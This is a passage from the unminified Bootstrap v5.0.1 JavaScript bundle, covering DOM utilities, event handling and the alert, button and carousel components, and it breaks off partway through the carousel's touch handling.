/*!
  * Bootstrap v5.0.1 (https://getbootstrap.com/)
  * Copyright 2011-2021 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
  */
(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('@popperjs/core')) :
  typeof define === 'function' && define.amd ? define(['@popperjs/core'], factory) :
  (global = typeof globalThis !== 'undefined' ? globalThis : global || self, global.bootstrap = factory(global.Popper));
}(this, (function (Popper) { 'use strict';

  function _interopNamespace(e) {
    if (e && e.__esModule) return e;
    var n = Object.create(null);
    if (e) {
      Object.keys(e).forEach(function (k) {
        if (k !== 'default') {
          var d = Object.getOwnPropertyDescriptor(e, k);
          Object.defineProperty(n, k, d.get ? d : {
            enumerable: true,
            get: function () {
              return e[k];
            }
          });
        }
      });
    }
    n['default'] = e;
    return Object.freeze(n);
  }

  var Popper__namespace = /*#__PURE__*/_interopNamespace(Popper);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): dom/selector-engine.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */
  const NODE_TEXT = 3;
  const SelectorEngine = {
    find(selector, element = document.documentElement) {
      return [].concat(...Element.prototype.querySelectorAll.call(element, selector));
    },

    findOne(selector, element = document.documentElement) {
      return Element.prototype.querySelector.call(element, selector);
    },

    children(element, selector) {
      return [].concat(...element.children).filter(child => child.matches(selector));
    },

    parents(element, selector) {
      const parents = [];
      let ancestor = element.parentNode;

      while (ancestor && ancestor.nodeType === Node.ELEMENT_NODE && ancestor.nodeType !== NODE_TEXT) {
        if (ancestor.matches(selector)) {
          parents.push(ancestor);
        }

        ancestor = ancestor.parentNode;
      }

      return parents;
    },

    prev(element, selector) {
      let previous = element.previousElementSibling;

      while (previous) {
        if (previous.matches(selector)) {
          return [previous];
        }

        previous = previous.previousElementSibling;
      }

      return [];
    },

    next(element, selector) {
      let next = element.nextElementSibling;

      while (next) {
        if (next.matches(selector)) {
          return [next];
        }

        next = next.nextElementSibling;
      }

      return [];
    }

  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): util/index.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */

  const MAX_UID = 1000000;
  const MILLISECONDS_MULTIPLIER = 1000;
  const TRANSITION_END = 'transitionend'; // Shoutout AngusCroll (https://goo.gl/pxwQGp)

  const toType = obj => {
    if (obj === null || obj === undefined) {
      return `${obj}`;
    }

    return {}.toString.call(obj).match(/\s([a-z]+)/i)[1].toLowerCase();
  };
  /**
   * --------------------------------------------------------------------------
   * Public Util Api
   * --------------------------------------------------------------------------
   */


  const getUID = prefix => {
    do {
      prefix += Math.floor(Math.random() * MAX_UID);
    } while (document.getElementById(prefix));

    return prefix;
  };

  const getSelector = element => {
    let selector = element.getAttribute('data-bs-target');

    if (!selector || selector === '#') {
      let hrefAttr = element.getAttribute('href'); // The only valid content that could double as a selector are IDs or classes,
      // so everything starting with `#` or `.`. If a "real" URL is used as the selector,
      // `document.querySelector` will rightfully complain it is invalid.
      // See https://github.com/twbs/bootstrap/issues/32273

      if (!hrefAttr || !hrefAttr.includes('#') && !hrefAttr.startsWith('.')) {
        return null;
      } // Just in case some CMS puts out a full URL with the anchor appended


      if (hrefAttr.includes('#') && !hrefAttr.startsWith('#')) {
        hrefAttr = `#${hrefAttr.split('#')[1]}`;
      }

      selector = hrefAttr && hrefAttr !== '#' ? hrefAttr.trim() : null;
    }

    return selector;
  };

  const getSelectorFromElement = element => {
    const selector = getSelector(element);

    if (selector) {
      return document.querySelector(selector) ? selector : null;
    }

    return null;
  };

  const getElementFromSelector = element => {
    const selector = getSelector(element);
    return selector ? document.querySelector(selector) : null;
  };

  const getTransitionDurationFromElement = element => {
    if (!element) {
      return 0;
    } // Get transition-duration of the element


    let {
      transitionDuration,
      transitionDelay
    } = window.getComputedStyle(element);
    const floatTransitionDuration = Number.parseFloat(transitionDuration);
    const floatTransitionDelay = Number.parseFloat(transitionDelay); // Return 0 if element or transition duration is not found

    if (!floatTransitionDuration && !floatTransitionDelay) {
      return 0;
    } // If multiple durations are defined, take the first


    transitionDuration = transitionDuration.split(',')[0];
    transitionDelay = transitionDelay.split(',')[0];
    return (Number.parseFloat(transitionDuration) + Number.parseFloat(transitionDelay)) * MILLISECONDS_MULTIPLIER;
  };

  const triggerTransitionEnd = element => {
    element.dispatchEvent(new Event(TRANSITION_END));
  };

  const isElement = obj => {
    if (!obj || typeof obj !== 'object') {
      return false;
    }

    if (typeof obj.jquery !== 'undefined') {
      obj = obj[0];
    }

    return typeof obj.nodeType !== 'undefined';
  };

  const getElement = obj => {
    if (isElement(obj)) {
      // it's a jQuery object or a node element
      return obj.jquery ? obj[0] : obj;
    }

    if (typeof obj === 'string' && obj.length > 0) {
      return SelectorEngine.findOne(obj);
    }

    return null;
  };

  const emulateTransitionEnd = (element, duration) => {
    let called = false;
    const durationPadding = 5;
    const emulatedDuration = duration + durationPadding;

    function listener() {
      called = true;
      element.removeEventListener(TRANSITION_END, listener);
    }

    element.addEventListener(TRANSITION_END, listener);
    setTimeout(() => {
      if (!called) {
        triggerTransitionEnd(element);
      }
    }, emulatedDuration);
  };

  const typeCheckConfig = (componentName, config, configTypes) => {
    Object.keys(configTypes).forEach(property => {
      const expectedTypes = configTypes[property];
      const value = config[property];
      const valueType = value && isElement(value) ? 'element' : toType(value);

      if (!new RegExp(expectedTypes).test(valueType)) {
        throw new TypeError(`${componentName.toUpperCase()}: Option "${property}" provided type "${valueType}" but expected type "${expectedTypes}".`);
      }
    });
  };

  const isVisible = element => {
    if (!element) {
      return false;
    }

    if (element.style && element.parentNode && element.parentNode.style) {
      const elementStyle = getComputedStyle(element);
      const parentNodeStyle = getComputedStyle(element.parentNode);
      return elementStyle.display !== 'none' && parentNodeStyle.display !== 'none' && elementStyle.visibility !== 'hidden';
    }

    return false;
  };

  const isDisabled = element => {
    if (!element || element.nodeType !== Node.ELEMENT_NODE) {
      return true;
    }

    if (element.classList.contains('disabled')) {
      return true;
    }

    if (typeof element.disabled !== 'undefined') {
      return element.disabled;
    }

    return element.hasAttribute('disabled') && element.getAttribute('disabled') !== 'false';
  };

  const findShadowRoot = element => {
    if (!document.documentElement.attachShadow) {
      return null;
    } // Can find the shadow root otherwise it'll return the document


    if (typeof element.getRootNode === 'function') {
      const root = element.getRootNode();
      return root instanceof ShadowRoot ? root : null;
    }

    if (element instanceof ShadowRoot) {
      return element;
    } // when we don't find a shadow root


    if (!element.parentNode) {
      return null;
    }

    return findShadowRoot(element.parentNode);
  };

  const noop = () => {};

  const reflow = element => element.offsetHeight;

  const getjQuery = () => {
    const {
      jQuery
    } = window;

    if (jQuery && !document.body.hasAttribute('data-bs-no-jquery')) {
      return jQuery;
    }

    return null;
  };

  const onDOMContentLoaded = callback => {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', callback);
    } else {
      callback();
    }
  };

  const isRTL = () => document.documentElement.dir === 'rtl';

  const defineJQueryPlugin = plugin => {
    onDOMContentLoaded(() => {
      const $ = getjQuery();
      /* istanbul ignore if */

      if ($) {
        const name = plugin.NAME;
        const JQUERY_NO_CONFLICT = $.fn[name];
        $.fn[name] = plugin.jQueryInterface;
        $.fn[name].Constructor = plugin;

        $.fn[name].noConflict = () => {
          $.fn[name] = JQUERY_NO_CONFLICT;
          return plugin.jQueryInterface;
        };
      }
    });
  };

  const execute = callback => {
    if (typeof callback === 'function') {
      callback();
    }
  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): dom/data.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */
  const elementMap = new Map();
  var Data = {
    set(element, key, instance) {
      if (!elementMap.has(element)) {
        elementMap.set(element, new Map());
      }

      const instanceMap = elementMap.get(element); // make it clear we only want one instance per element
      // can be removed later when multiple key/instances are fine to be used

      if (!instanceMap.has(key) && instanceMap.size !== 0) {
        // eslint-disable-next-line no-console
        console.error(`Bootstrap doesn't allow more than one instance per element. Bound instance: ${Array.from(instanceMap.keys())[0]}.`);
        return;
      }

      instanceMap.set(key, instance);
    },

    get(element, key) {
      if (elementMap.has(element)) {
        return elementMap.get(element).get(key) || null;
      }

      return null;
    },

    remove(element, key) {
      if (!elementMap.has(element)) {
        return;
      }

      const instanceMap = elementMap.get(element);
      instanceMap.delete(key); // free up element references if there are no instances left for an element

      if (instanceMap.size === 0) {
        elementMap.delete(element);
      }
    }

  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): dom/event-handler.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const namespaceRegex = /[^.]*(?=\..*)\.|.*/;
  const stripNameRegex = /\..*/;
  const stripUidRegex = /::\d+$/;
  const eventRegistry = {}; // Events storage

  let uidEvent = 1;
  const customEvents = {
    mouseenter: 'mouseover',
    mouseleave: 'mouseout'
  };
  const customEventsRegex = /^(mouseenter|mouseleave)/i;
  const nativeEvents = new Set(['click', 'dblclick', 'mouseup', 'mousedown', 'contextmenu', 'mousewheel', 'DOMMouseScroll', 'mouseover', 'mouseout', 'mousemove', 'selectstart', 'selectend', 'keydown', 'keypress', 'keyup', 'orientationchange', 'touchstart', 'touchmove', 'touchend', 'touchcancel', 'pointerdown', 'pointermove', 'pointerup', 'pointerleave', 'pointercancel', 'gesturestart', 'gesturechange', 'gestureend', 'focus', 'blur', 'change', 'reset', 'select', 'submit', 'focusin', 'focusout', 'load', 'unload', 'beforeunload', 'resize', 'move', 'DOMContentLoaded', 'readystatechange', 'error', 'abort', 'scroll']);
  /**
   * ------------------------------------------------------------------------
   * Private methods
   * ------------------------------------------------------------------------
   */

  function getUidEvent(element, uid) {
    return uid && `${uid}::${uidEvent++}` || element.uidEvent || uidEvent++;
  }

  function getEvent(element) {
    const uid = getUidEvent(element);
    element.uidEvent = uid;
    eventRegistry[uid] = eventRegistry[uid] || {};
    return eventRegistry[uid];
  }

  function bootstrapHandler(element, fn) {
    return function handler(event) {
      event.delegateTarget = element;

      if (handler.oneOff) {
        EventHandler.off(element, event.type, fn);
      }

      return fn.apply(element, [event]);
    };
  }

  function bootstrapDelegationHandler(element, selector, fn) {
    return function handler(event) {
      const domElements = element.querySelectorAll(selector);

      for (let {
        target
      } = event; target && target !== this; target = target.parentNode) {
        for (let i = domElements.length; i--;) {
          if (domElements[i] === target) {
            event.delegateTarget = target;

            if (handler.oneOff) {
              // eslint-disable-next-line unicorn/consistent-destructuring
              EventHandler.off(element, event.type, selector, fn);
            }

            return fn.apply(target, [event]);
          }
        }
      } // To please ESLint


      return null;
    };
  }

  function findHandler(events, handler, delegationSelector = null) {
    const uidEventList = Object.keys(events);

    for (let i = 0, len = uidEventList.length; i < len; i++) {
      const event = events[uidEventList[i]];

      if (event.originalHandler === handler && event.delegationSelector === delegationSelector) {
        return event;
      }
    }

    return null;
  }

  function normalizeParams(originalTypeEvent, handler, delegationFn) {
    const delegation = typeof handler === 'string';
    const originalHandler = delegation ? delegationFn : handler;
    let typeEvent = getTypeEvent(originalTypeEvent);
    const isNative = nativeEvents.has(typeEvent);

    if (!isNative) {
      typeEvent = originalTypeEvent;
    }

    return [delegation, originalHandler, typeEvent];
  }

  function addHandler(element, originalTypeEvent, handler, delegationFn, oneOff) {
    if (typeof originalTypeEvent !== 'string' || !element) {
      return;
    }

    if (!handler) {
      handler = delegationFn;
      delegationFn = null;
    } // in case of mouseenter or mouseleave wrap the handler within a function that checks for its DOM position
    // this prevents the handler from being dispatched the same way as mouseover or mouseout does


    if (customEventsRegex.test(originalTypeEvent)) {
      const wrapFn = fn => {
        return function (event) {
          if (!event.relatedTarget || event.relatedTarget !== event.delegateTarget && !event.delegateTarget.contains(event.relatedTarget)) {
            return fn.call(this, event);
          }
        };
      };

      if (delegationFn) {
        delegationFn = wrapFn(delegationFn);
      } else {
        handler = wrapFn(handler);
      }
    }

    const [delegation, originalHandler, typeEvent] = normalizeParams(originalTypeEvent, handler, delegationFn);
    const events = getEvent(element);
    const handlers = events[typeEvent] || (events[typeEvent] = {});
    const previousFn = findHandler(handlers, originalHandler, delegation ? handler : null);

    if (previousFn) {
      previousFn.oneOff = previousFn.oneOff && oneOff;
      return;
    }

    const uid = getUidEvent(originalHandler, originalTypeEvent.replace(namespaceRegex, ''));
    const fn = delegation ? bootstrapDelegationHandler(element, handler, delegationFn) : bootstrapHandler(element, handler);
    fn.delegationSelector = delegation ? handler : null;
    fn.originalHandler = originalHandler;
    fn.oneOff = oneOff;
    fn.uidEvent = uid;
    handlers[uid] = fn;
    element.addEventListener(typeEvent, fn, delegation);
  }

  function removeHandler(element, events, typeEvent, handler, delegationSelector) {
    const fn = findHandler(events[typeEvent], handler, delegationSelector);

    if (!fn) {
      return;
    }

    element.removeEventListener(typeEvent, fn, Boolean(delegationSelector));
    delete events[typeEvent][fn.uidEvent];
  }

  function removeNamespacedHandlers(element, events, typeEvent, namespace) {
    const storeElementEvent = events[typeEvent] || {};
    Object.keys(storeElementEvent).forEach(handlerKey => {
      if (handlerKey.includes(namespace)) {
        const event = storeElementEvent[handlerKey];
        removeHandler(element, events, typeEvent, event.originalHandler, event.delegationSelector);
      }
    });
  }

  function getTypeEvent(event) {
    // allow to get the native events from namespaced events ('click.bs.button' --> 'click')
    event = event.replace(stripNameRegex, '');
    return customEvents[event] || event;
  }

  const EventHandler = {
    on(element, event, handler, delegationFn) {
      addHandler(element, event, handler, delegationFn, false);
    },

    one(element, event, handler, delegationFn) {
      addHandler(element, event, handler, delegationFn, true);
    },

    off(element, originalTypeEvent, handler, delegationFn) {
      if (typeof originalTypeEvent !== 'string' || !element) {
        return;
      }

      const [delegation, originalHandler, typeEvent] = normalizeParams(originalTypeEvent, handler, delegationFn);
      const inNamespace = typeEvent !== originalTypeEvent;
      const events = getEvent(element);
      const isNamespace = originalTypeEvent.startsWith('.');

      if (typeof originalHandler !== 'undefined') {
        // Simplest case: handler is passed, remove that listener ONLY.
        if (!events || !events[typeEvent]) {
          return;
        }

        removeHandler(element, events, typeEvent, originalHandler, delegation ? handler : null);
        return;
      }

      if (isNamespace) {
        Object.keys(events).forEach(elementEvent => {
          removeNamespacedHandlers(element, events, elementEvent, originalTypeEvent.slice(1));
        });
      }

      const storeElementEvent = events[typeEvent] || {};
      Object.keys(storeElementEvent).forEach(keyHandlers => {
        const handlerKey = keyHandlers.replace(stripUidRegex, '');

        if (!inNamespace || originalTypeEvent.includes(handlerKey)) {
          const event = storeElementEvent[keyHandlers];
          removeHandler(element, events, typeEvent, event.originalHandler, event.delegationSelector);
        }
      });
    },

    trigger(element, event, args) {
      if (typeof event !== 'string' || !element) {
        return null;
      }

      const $ = getjQuery();
      const typeEvent = getTypeEvent(event);
      const inNamespace = event !== typeEvent;
      const isNative = nativeEvents.has(typeEvent);
      let jQueryEvent;
      let bubbles = true;
      let nativeDispatch = true;
      let defaultPrevented = false;
      let evt = null;

      if (inNamespace && $) {
        jQueryEvent = $.Event(event, args);
        $(element).trigger(jQueryEvent);
        bubbles = !jQueryEvent.isPropagationStopped();
        nativeDispatch = !jQueryEvent.isImmediatePropagationStopped();
        defaultPrevented = jQueryEvent.isDefaultPrevented();
      }

      if (isNative) {
        evt = document.createEvent('HTMLEvents');
        evt.initEvent(typeEvent, bubbles, true);
      } else {
        evt = new CustomEvent(event, {
          bubbles,
          cancelable: true
        });
      } // merge custom information in our event


      if (typeof args !== 'undefined') {
        Object.keys(args).forEach(key => {
          Object.defineProperty(evt, key, {
            get() {
              return args[key];
            }

          });
        });
      }

      if (defaultPrevented) {
        evt.preventDefault();
      }

      if (nativeDispatch) {
        element.dispatchEvent(evt);
      }

      if (evt.defaultPrevented && typeof jQueryEvent !== 'undefined') {
        jQueryEvent.preventDefault();
      }

      return evt;
    }

  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): base-component.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const VERSION = '5.0.1';

  class BaseComponent {
    constructor(element) {
      element = getElement(element);

      if (!element) {
        return;
      }

      this._element = element;
      Data.set(this._element, this.constructor.DATA_KEY, this);
    }

    dispose() {
      Data.remove(this._element, this.constructor.DATA_KEY);
      EventHandler.off(this._element, this.constructor.EVENT_KEY);
      Object.getOwnPropertyNames(this).forEach(propertyName => {
        this[propertyName] = null;
      });
    }

    _queueCallback(callback, element, isAnimated = true) {
      if (!isAnimated) {
        execute(callback);
        return;
      }

      const transitionDuration = getTransitionDurationFromElement(element);
      EventHandler.one(element, 'transitionend', () => execute(callback));
      emulateTransitionEnd(element, transitionDuration);
    }
    /** Static */


    static getInstance(element) {
      return Data.get(element, this.DATA_KEY);
    }

    static get VERSION() {
      return VERSION;
    }

    static get NAME() {
      throw new Error('You have to implement the static method "NAME", for each component!');
    }

    static get DATA_KEY() {
      return `bs.${this.NAME}`;
    }

    static get EVENT_KEY() {
      return `.${this.DATA_KEY}`;
    }

  }

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): alert.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$c = 'alert';
  const DATA_KEY$b = 'bs.alert';
  const EVENT_KEY$b = `.${DATA_KEY$b}`;
  const DATA_API_KEY$8 = '.data-api';
  const SELECTOR_DISMISS = '[data-bs-dismiss="alert"]';
  const EVENT_CLOSE = `close${EVENT_KEY$b}`;
  const EVENT_CLOSED = `closed${EVENT_KEY$b}`;
  const EVENT_CLICK_DATA_API$7 = `click${EVENT_KEY$b}${DATA_API_KEY$8}`;
  const CLASS_NAME_ALERT = 'alert';
  const CLASS_NAME_FADE$6 = 'fade';
  const CLASS_NAME_SHOW$9 = 'show';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Alert extends BaseComponent {
    // Getters
    static get NAME() {
      return NAME$c;
    } // Public


    close(element) {
      const rootElement = element ? this._getRootElement(element) : this._element;

      const customEvent = this._triggerCloseEvent(rootElement);

      if (customEvent === null || customEvent.defaultPrevented) {
        return;
      }

      this._removeElement(rootElement);
    } // Private


    _getRootElement(element) {
      return getElementFromSelector(element) || element.closest(`.${CLASS_NAME_ALERT}`);
    }

    _triggerCloseEvent(element) {
      return EventHandler.trigger(element, EVENT_CLOSE);
    }

    _removeElement(element) {
      element.classList.remove(CLASS_NAME_SHOW$9);
      const isAnimated = element.classList.contains(CLASS_NAME_FADE$6);

      this._queueCallback(() => this._destroyElement(element), element, isAnimated);
    }

    _destroyElement(element) {
      if (element.parentNode) {
        element.parentNode.removeChild(element);
      }

      EventHandler.trigger(element, EVENT_CLOSED);
    } // Static


    static jQueryInterface(config) {
      return this.each(function () {
        let data = Data.get(this, DATA_KEY$b);

        if (!data) {
          data = new Alert(this);
        }

        if (config === 'close') {
          data[config](this);
        }
      });
    }

    static handleDismiss(alertInstance) {
      return function (event) {
        if (event) {
          event.preventDefault();
        }

        alertInstance.close(this);
      };
    }

  }
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  EventHandler.on(document, EVENT_CLICK_DATA_API$7, SELECTOR_DISMISS, Alert.handleDismiss(new Alert()));
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .Alert to jQuery only if jQuery is present
   */

  defineJQueryPlugin(Alert);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): button.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$b = 'button';
  const DATA_KEY$a = 'bs.button';
  const EVENT_KEY$a = `.${DATA_KEY$a}`;
  const DATA_API_KEY$7 = '.data-api';
  const CLASS_NAME_ACTIVE$3 = 'active';
  const SELECTOR_DATA_TOGGLE$5 = '[data-bs-toggle="button"]';
  const EVENT_CLICK_DATA_API$6 = `click${EVENT_KEY$a}${DATA_API_KEY$7}`;
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Button extends BaseComponent {
    // Getters
    static get NAME() {
      return NAME$b;
    } // Public


    toggle() {
      // Toggle class and sync the `aria-pressed` attribute with the return value of the `.toggle()` method
      this._element.setAttribute('aria-pressed', this._element.classList.toggle(CLASS_NAME_ACTIVE$3));
    } // Static


    static jQueryInterface(config) {
      return this.each(function () {
        let data = Data.get(this, DATA_KEY$a);

        if (!data) {
          data = new Button(this);
        }

        if (config === 'toggle') {
          data[config]();
        }
      });
    }

  }
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  EventHandler.on(document, EVENT_CLICK_DATA_API$6, SELECTOR_DATA_TOGGLE$5, event => {
    event.preventDefault();
    const button = event.target.closest(SELECTOR_DATA_TOGGLE$5);
    let data = Data.get(button, DATA_KEY$a);

    if (!data) {
      data = new Button(button);
    }

    data.toggle();
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .Button to jQuery only if jQuery is present
   */

  defineJQueryPlugin(Button);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): dom/manipulator.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  function normalizeData(val) {
    if (val === 'true') {
      return true;
    }

    if (val === 'false') {
      return false;
    }

    if (val === Number(val).toString()) {
      return Number(val);
    }

    if (val === '' || val === 'null') {
      return null;
    }

    return val;
  }

  function normalizeDataKey(key) {
    return key.replace(/[A-Z]/g, chr => `-${chr.toLowerCase()}`);
  }

  const Manipulator = {
    setDataAttribute(element, key, value) {
      element.setAttribute(`data-bs-${normalizeDataKey(key)}`, value);
    },

    removeDataAttribute(element, key) {
      element.removeAttribute(`data-bs-${normalizeDataKey(key)}`);
    },

    getDataAttributes(element) {
      if (!element) {
        return {};
      }

      const attributes = {};
      Object.keys(element.dataset).filter(key => key.startsWith('bs')).forEach(key => {
        let pureKey = key.replace(/^bs/, '');
        pureKey = pureKey.charAt(0).toLowerCase() + pureKey.slice(1, pureKey.length);
        attributes[pureKey] = normalizeData(element.dataset[key]);
      });
      return attributes;
    },

    getDataAttribute(element, key) {
      return normalizeData(element.getAttribute(`data-bs-${normalizeDataKey(key)}`));
    },

    offset(element) {
      const rect = element.getBoundingClientRect();
      return {
        top: rect.top + document.body.scrollTop,
        left: rect.left + document.body.scrollLeft
      };
    },

    position(element) {
      return {
        top: element.offsetTop,
        left: element.offsetLeft
      };
    }

  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): carousel.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$a = 'carousel';
  const DATA_KEY$9 = 'bs.carousel';
  const EVENT_KEY$9 = `.${DATA_KEY$9}`;
  const DATA_API_KEY$6 = '.data-api';
  const ARROW_LEFT_KEY = 'ArrowLeft';
  const ARROW_RIGHT_KEY = 'ArrowRight';
  const TOUCHEVENT_COMPAT_WAIT = 500; // Time for mouse compat events to fire after touch

  const SWIPE_THRESHOLD = 40;
  const Default$9 = {
    interval: 5000,
    keyboard: true,
    slide: false,
    pause: 'hover',
    wrap: true,
    touch: true
  };
  const DefaultType$9 = {
    interval: '(number|boolean)',
    keyboard: 'boolean',
    slide: '(boolean|string)',
    pause: '(string|boolean)',
    wrap: 'boolean',
    touch: 'boolean'
  };
  const ORDER_NEXT = 'next';
  const ORDER_PREV = 'prev';
  const DIRECTION_LEFT = 'left';
  const DIRECTION_RIGHT = 'right';
  const EVENT_SLIDE = `slide${EVENT_KEY$9}`;
  const EVENT_SLID = `slid${EVENT_KEY$9}`;
  const EVENT_KEYDOWN = `keydown${EVENT_KEY$9}`;
  const EVENT_MOUSEENTER = `mouseenter${EVENT_KEY$9}`;
  const EVENT_MOUSELEAVE = `mouseleave${EVENT_KEY$9}`;
  const EVENT_TOUCHSTART = `touchstart${EVENT_KEY$9}`;
  const EVENT_TOUCHMOVE = `touchmove${EVENT_KEY$9}`;
  const EVENT_TOUCHEND = `touchend${EVENT_KEY$9}`;
  const EVENT_POINTERDOWN = `pointerdown${EVENT_KEY$9}`;
  const EVENT_POINTERUP = `pointerup${EVENT_KEY$9}`;
  const EVENT_DRAG_START = `dragstart${EVENT_KEY$9}`;
  const EVENT_LOAD_DATA_API$2 = `load${EVENT_KEY$9}${DATA_API_KEY$6}`;
  const EVENT_CLICK_DATA_API$5 = `click${EVENT_KEY$9}${DATA_API_KEY$6}`;
  const CLASS_NAME_CAROUSEL = 'carousel';
  const CLASS_NAME_ACTIVE$2 = 'active';
  const CLASS_NAME_SLIDE = 'slide';
  const CLASS_NAME_END = 'carousel-item-end';
  const CLASS_NAME_START = 'carousel-item-start';
  const CLASS_NAME_NEXT = 'carousel-item-next';
  const CLASS_NAME_PREV = 'carousel-item-prev';
  const CLASS_NAME_POINTER_EVENT = 'pointer-event';
  const SELECTOR_ACTIVE$1 = '.active';
  const SELECTOR_ACTIVE_ITEM = '.active.carousel-item';
  const SELECTOR_ITEM = '.carousel-item';
  const SELECTOR_ITEM_IMG = '.carousel-item img';
  const SELECTOR_NEXT_PREV = '.carousel-item-next, .carousel-item-prev';
  const SELECTOR_INDICATORS = '.carousel-indicators';
  const SELECTOR_INDICATOR = '[data-bs-target]';
  const SELECTOR_DATA_SLIDE = '[data-bs-slide], [data-bs-slide-to]';
  const SELECTOR_DATA_RIDE = '[data-bs-ride="carousel"]';
  const POINTER_TYPE_TOUCH = 'touch';
  const POINTER_TYPE_PEN = 'pen';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Carousel extends BaseComponent {
    constructor(element, config) {
      super(element);
      this._items = null;
      this._interval = null;
      this._activeElement = null;
      this._isPaused = false;
      this._isSliding = false;
      this.touchTimeout = null;
      this.touchStartX = 0;
      this.touchDeltaX = 0;
      this._config = this._getConfig(config);
      this._indicatorsElement = SelectorEngine.findOne(SELECTOR_INDICATORS, this._element);
      this._touchSupported = 'ontouchstart' in document.documentElement || navigator.maxTouchPoints > 0;
      this._pointerEvent = Boolean(window.PointerEvent);

      this._addEventListeners();
    } // Getters


    static get Default() {
      return Default$9;
    }

    static get NAME() {
      return NAME$a;
    } // Public


    next() {
      if (!this._isSliding) {
        this._slide(ORDER_NEXT);
      }
    }

    nextWhenVisible() {
      // Don't call next when the page isn't visible
      // or the carousel or its parent isn't visible
      if (!document.hidden && isVisible(this._element)) {
        this.next();
      }
    }

    prev() {
      if (!this._isSliding) {
        this._slide(ORDER_PREV);
      }
    }

    pause(event) {
      if (!event) {
        this._isPaused = true;
      }

      if (SelectorEngine.findOne(SELECTOR_NEXT_PREV, this._element)) {
        triggerTransitionEnd(this._element);
        this.cycle(true);
      }

      clearInterval(this._interval);
      this._interval = null;
    }

    cycle(event) {
      if (!event) {
        this._isPaused = false;
      }

      if (this._interval) {
        clearInterval(this._interval);
        this._interval = null;
      }

      if (this._config && this._config.interval && !this._isPaused) {
        this._updateInterval();

        this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval);
      }
    }

    to(index) {
      this._activeElement = SelectorEngine.findOne(SELECTOR_ACTIVE_ITEM, this._element);

      const activeIndex = this._getItemIndex(this._activeElement);

      if (index > this._items.length - 1 || index < 0) {
        return;
      }

      if (this._isSliding) {
        EventHandler.one(this._element, EVENT_SLID, () => this.to(index));
        return;
      }

      if (activeIndex === index) {
        this.pause();
        this.cycle();
        return;
      }

      const order = index > activeIndex ? ORDER_NEXT : ORDER_PREV;

      this._slide(order, this._items[index]);
    } // Private


    _getConfig(config) {
      config = { ...Default$9,
        ...config
      };
      typeCheckConfig(NAME$a, config, DefaultType$9);
      return config;
    }

    _handleSwipe() {
      const absDeltax = Math.abs(this.touchDeltaX);

      if (absDeltax <= SWIPE_THRESHOLD) {
        return;
      }

      const direction = absDeltax / this.touchDeltaX;
      this.touchDeltaX = 0;

      if (!direction) {
        return;
      }

      this._slide(direction > 0 ? DIRECTION_RIGHT : DIRECTION_LEFT);
    }

    _addEventListeners() {
      if (this._config.keyboard) {
        EventHandler.on(this._element, EVENT_KEYDOWN, event => this._keydown(event));
      }

      if (this._config.pause === 'hover') {
        EventHandler.on(this._element, EVENT_MOUSEENTER, event => this.pause(event));
        EventHandler.on(this._element, EVENT_MOUSELEAVE, event => this.cycle(event));
      }

      if (this._config.touch && this._touchSupported) {
        this._addTouchEventListeners();
      }
    }

    _addTouchEventListeners() {
      const start = event => {
        if (this._pointerEvent && (event.pointerType === POINTER_TYPE_PEN || event.pointerType === POINTER_TYPE_TOUCH)) {
          this.touchStartX = event.clientX;
        } else if (!this._pointerEvent) {
          this.touchStartX = event.touches[0].clientX;
        }
